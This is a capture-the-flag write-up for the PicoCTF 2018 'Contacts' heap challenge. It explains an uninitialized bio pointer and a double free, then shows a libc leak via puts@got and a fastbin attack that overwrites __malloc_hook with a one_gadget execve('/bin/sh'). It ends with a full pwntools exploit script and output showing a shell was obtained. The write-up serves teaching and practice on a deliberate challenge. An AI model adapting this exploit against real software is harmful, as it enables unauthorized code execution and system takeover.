## PicoCTF 2018 Contacts - Points: 850 - (Solves: 50)

This program for storing your contacts is currently in beta. Can you hijack control and get a shell? Connect with nc 2018shell2.picoctf.com 56667. Source. libc.so.6
If only the author used calloc() instead...
fastbin fastbin fastbin

The source was provided for this one, I put it at [contacts](https://github.com/Mithreindeir/ctf-writeups/blob/master/pico-ctf2018/contacts/contacts.c)

Ok so the program is pretty simple. It lets us make a contact, set a contact biography, delete a contact, or display all contacts.
The biography function looks promising:

```C
void set_bio(struct contact *contact){
    char input[4];
    size_t length;

    /* we'll replace the old bio */
    if (contact->bio != NULL){
        free(contact->bio);
    }

    puts("How long will the bio be?");
    if (fgets(input, 4, stdin) == NULL){
        puts("Couldn't read length.");
        return;
    };

    length = strtoul(input, NULL, 10);
    if (length > 255){
        puts("Bio must be at most 255 characters.");
        return;
    }

    contact->bio = (char *)malloc(length+1);
    if (contact->bio == NULL){
        puts("Couldn't allocate bio.");
        exit(-1);
    }

    puts("Enter your new bio:");
    if (fgets(contact->bio, length+1, stdin) == NULL){
        puts("Couldn't read bio.");
        return;
    }

    puts("Bio recorded.");
}
```

OK this has a double free vulnerability. You can get it free'd then make an early exit by putting an invalid size.
Lets look at the create contact function:

```C
void create_contact(char *name){
    if (num_contacts == MAX_CONTACTS){
        puts("Too many contacts! Delete one first!");
        return;
    }

    struct contact *contact = (struct contact *)malloc(sizeof(struct contact));
    if (contact == NULL){
        puts("Could not allocate new contact.");
        exit(-1);
    };

    /* make a copy of the name on the heap */
    contact->name = strdup(name);
    if (contact->name == NULL){
        puts("Could not duplicate name.");
        exit(-1);
    }

    contacts[num_contacts++] = contact;
}
```
This also has a problem. It doesn't initialize the biography variable. Let's exploit this using first fit.
For those unaware, first fit is a characteristic of the glibc allocator. If you free a chunk, then allocate one of the same size, it will return the same chunk, without clearing it
(that's why the hint said if only calloc was used, because calloc would clear it.) Note this only works for chunks of fastbin size because they are LIFO (last in first out), other sized chunks will get fit eventually but they are (FIFO), so the chunks are returned in the order they were freed in. Anyhow lets exploit this:


we put the address of puts@got into a chunk the same size as the contacts struct (0x10), with the offset of contact-\>bio (0x8)
So we make a bio with 8 bytes of padding, then the puts@got
```python
    puts = struct.pack("L", 0x602020)
    A = alloc(p, "user")
    # Put &puts@got into heap with padding to make size of user struct
    bio(p, A, "A"*8+puts, 16)
    free_bio(p, A) #fastbin->top now has value of &puts@got
    # B gets fastbin top
    B = alloc(p, "user2") # No initializer, now B->bio is &puts@got
    libc = leak(p, B) - 0x6f690 # leaks puts@got and subtract offset for base
```

Ok we already have a libc leak, without even exploiting anything.
```
[*] libc base: 0x7fa99d5dd000
```

Great, now what. Well remember that double free we found in bio earlier?
Fastbin attack!
I explained this in another writeup, but I am gonna paste it here as they use the same technique.
For those unaware of the fastbin vulnerability, I will briefly go over it, but there are various online guides that cover it better.

Malloc'd chunks of fastbin size have this approximate structure:
```
chunk addr->  ********************************
              * prev_size       | size & flags*
mem addr->    ********************************
              *   user controlled space      *
              ********************************
next chunk->  * next chunk size              *
```
However when they are free'd, a pointer to the next chunk is set at the beginning of the user controlled space.

Fastbin attacks work by exploiting the fastbin freelist. The glibc allocator has 10 linked list pointers or "bins" for chunks of fastbin size. Everytime a fastbin chunk is free'd, it will be put as the HEAD of the corresponding fastbin, and the first 8 bytes of the allocated part of the chunk will be set as a pointer the the next chunk in the list.
If we can overwrite the pointer to the next chunk, we can control the address returned by a malloc.
The only security check we have to worry about is that our fake chunk has a size&flags that would put it in the same bin as the chunk we are overwriting. Otherwise we get the error:
```
malloc(): memory corruption (fast)
```

One way to overwrite the next pointer is by having a double free in your program. The double free exploit is much
simpler than the fastbin. If we free a chunk twice, then it will be returned by malloc twice, or it will be returned once,
but still be on the fastbin linked list. The only security check right now is glibc checking if the free'd chunk is already HEAD of the freelist.To bypass this, we just have to free a different chunk of the same
size between the 1st and 2nd free.

ok lets get right to it. There is a function pointer in libc called \_\_malloc\_hook. This function is to debug malloc, and starts off NULL. If we can get the chunk-\>size to be in any fastbin range, we can
change the biography's size to be in the same fastbin, and do the attack.

Let's check the memory around \_\_malloc\_hook:
```
0x7ff4335b9af0:	0x00007ff4335b8260	0x0000000000000000
0x7ff4335b9b00 <__memalign_hook>:	0x00007ff43327ae20	0x00007ff43327aa00
0x7ff4335b9b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ff4335b9b20:	0x0000000100000000	0x0000000000000000
0x7ff4335b9b30:	0x0000000000000000	0x0000000000000000
0x7ff4335b9b40:	0x0000000000000000	0x0000000000000000
0x7ff4335b9b50:	0x0000000000000000	0x0000000000000000
```

Huh well it looks like its surrounded by addresses. They are all way above the fastbin size though. Well malloc might
align memory addresses, but we don't have to. Lets shift this until we can get a chunk that has a fastbin size, and
included the address of malloc_hook in the body.

```
0x7ff4335b9aed:	0xf4335b8260000000	0x000000000000007f
0x7ff4335b9afd:	0xf43327ae20000000	0xf43327aa0000007f
0x7ff4335b9b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7ff4335b9b1d:	0x0100000000000000	0x0000000000000000
```

Well 0x7f is of fastbin size. And the offset to malloc_hook is only 0x23, so we will have more than enough space to overwrite it. 

Let's leverage our double free to do a fastbin attack on the \_\_malloc_hook
```python
    m_hk = libc + 0x3C4B10
    # Fastbin attack
    # setting up
    # (we can only control malloc size for bio, so precreate as many contacts as needed)
    A = alloc(p, "A")
    B = alloc(p, "B")
    C = alloc(p, "C")
    D = alloc(p, "D")
    E = alloc(p, "E")
    F = alloc(p, "F")

    # we can use __malloc_chunk-0x23 as fake header, which would give a size of 0x7f
    fchunk = m_hk-0x23
    log.info('Corrupting fastchunk list with fake chunk at: ' + hex(fchunk))
    # malloc(0x60) creates size of 0x70 (0x71 with inuse), which is in the same bin as 0x7f
    msize = 0x60
    lbio(p, A, "A"*msize, msize) # alloc fastbin
    lbio(p, B, "B"*msize, msize) # alloc fastbin

    free_bio(p, B) # B->next is NULL B is top of fastbin
    free_bio(p, A) # A->next is NULL A is top of fastbin
    # double free B
    free_bio(p, B) # B->next = A B is top of fastbin


    # Fastbin returns B, overwrite B->next with fake chunk pointing above __malloc_hook
    lbio(p, C, " "+struct.pack("L", fchunk), msize)
    # Returns A
    bio(p, D, "", msize)
    # Returns B
    bio(p, E, "", msize)
    # Returns B->next or fake chunk above malloc hook
    # Overwrite __malloc_hook with whatever we want
    bio(p, F, "\x00"*0x13+"A"*8, msize)
    # This next call to malloc will invoke the function pointer __malloc_hook
```

Great lets test it.
```
Stopped reason: SIGSEGV
0x00007fc63c8932a3 in malloc () from ./libc.so.6
0x7fc63c8932a3 <malloc+371>:	jmp    rax
RAX: 0x4141414141414141 ('AAAAAAAA')
```
Now that we know it works, lets try to pop a shell. We could do system, but we don't control malloc_hook argument. However, most libc versions have gadgets that directly call execve on "/bin/sh"! There is this great tool [one_gadget](https://github.com/david942j/one_gadget) that can find these gadgets. And we will use that.
It found several gadgets, I just picked one.

Lets tie it all together:
```python
#!/bin/python2
from pwn import *
import re

context.terminal = ["termite", "-e"]

def alloc(p, c):
    p.sendline("create " + c)
    return c

def free(p, c):
    p.sendline("delete " + c)

def bio(p, c, b, l):
    p.sendline("bio " + c)
    p.sendlineafter("How long will the bio be?", str(int(l)))
    p.sendline(b)

#set bio bug, if size is 3 characters then bio must be right after length
def lbio(p, c, b, l):
    p.sendline("bio " + c)
    p.sendline(str(int(l))+b)
    
# can free bio any amount of times by forcing it to exit early
def free_bio(p, c):
    p.sendline("bio " + c)
    #max character is 255, so exit early by doing over that
    p.sendline("256")

def display(p, c):
    p.sendline("display")

def leak(p, c):
    p.sendline("display")
    l = p.recvline_contains(c + " -")
    bio = l.split('- ')[-1]
    bio = struct.unpack("L", bio + "\x00"*2)
    if p.can_recv():
        p.recv()
    return int(bio[0])


def break_heap():
    p = remote('2018shell2.picoctf.com', 56667)
    puts = struct.pack("L", 0x602020)
    A = alloc(p, "user")
    # Put &puts@got.plt into heap with padding to make size of user struct
    bio(p, A, "A"*8+puts, 16)
    free_bio(p, A) #fastbin->top now has value of &puts@got
    # B gets fastbin top
    B = alloc(p, "user2") # No initializer, now B->bio is &puts@got
    libc = leak(p, B) - 0x6f690 # leaks puts@got and subtract offset for base
    og = libc + 0x4526a
    m_hk = libc + 0x3C4B10
    log.info('libc base: ' + hex(libc))
    log.info('one gadget: ' + hex(og))
    log.info('__malloc_hook: ' + hex(m_hk))

    # Fastbin attack
    # setting up
    # (we can only control malloc size for bio, so precreate as many contacts as needed)
    A = alloc(p, "A")
    B = alloc(p, "B")
    C = alloc(p, "C")
    D = alloc(p, "D")
    E = alloc(p, "E")
    F = alloc(p, "F")

    # we can __malloc_chunk-0x23 as fake header, which would give a size of 0x7f
    fchunk = m_hk-0x23
    log.info('Corrupting fastchunk list with fake chunk at: ' + hex(fchunk))
    # malloc(0x60) creates size of 0x70 (0x71 with inuse), which is in the same bin as 0x7f
    msize = 0x60
    lbio(p, A, "A"*msize, msize) # alloc fastbin
    lbio(p, B, "B"*msize, msize) # alloc fastbin

    free_bio(p, B) # B->next is NULL B is top of fastbin
    free_bio(p, A) # A->next is NULL A is top of fastbin
    # double free B
    free_bio(p, B) # B->next = A B is top of fastbin

    # Fastbin returns B, overwrite B->next with fake chunk pointing above __malloc_hook
    lbio(p, C, " "+struct.pack("L", fchunk), msize)
    # Returns A
    bio(p, D, "", msize)
    # Returns B
    bio(p, E, "", msize)
    # Returns B->next or fake chunk above malloc hook
    # Overwrite __malloc_hook with one gadget of execv("/bin/sh")
    bio(p, F, "\x00"*0x13+struct.pack("L", og), msize)
    # This next call to malloc will invoke the function pointer __malloc_hook
    alloc(p, "win")

    p.interactive()

break_heap()
```

Aaaannnd:
```bash
[*] libc base: 0x7ff658535000
[*] one gadget: 0x7ff65857a26a
[*] __malloc_hook: 0x7ff6588f9b10
[*] Corrupting fastchunk list with fake chunk at: 0x7ff6588f9aed
[*] Switching to interactive mode

Bio must be at most 255 characters.

Enter your command:
> Invalid option
Available commands:
    display - display the contacts
    create [name] - create a new contact
    delete [name] - delete an existing contact
    bio [name] - set the bio for an existing contact
    quit - exit the program

Enter your command:
> How long will the bio be?
Bio must be at most 255 characters.

Enter your command:
> Invalid option
Available commands:
    display - display the contacts
    create [name] - create a new contact
    delete [name] - delete an existing contact
    bio [name] - set the bio for an existing contact
    quit - exit the program

Enter your command:
> How long will the bio be?
Bio must be at most 255 characters.

Enter your command:
> Invalid option
Available commands:
    display - display the contacts
    create [name] - create a new contact
    delete [name] - delete an existing contact
    bio [name] - set the bio for an existing contact
    quit - exit the program

Enter your command:
> How long will the bio be?
Enter your new bio:
Bio recorded.

Enter your command:
> How long will the bio be?
Enter your new bio:
Bio recorded.

Enter your command:
> How long will the bio be?
Enter your new bio:
Bio recorded.

Enter your command:
> How long will the bio be?
Enter your new bio:
Bio recorded.

Enter your command:
$
```
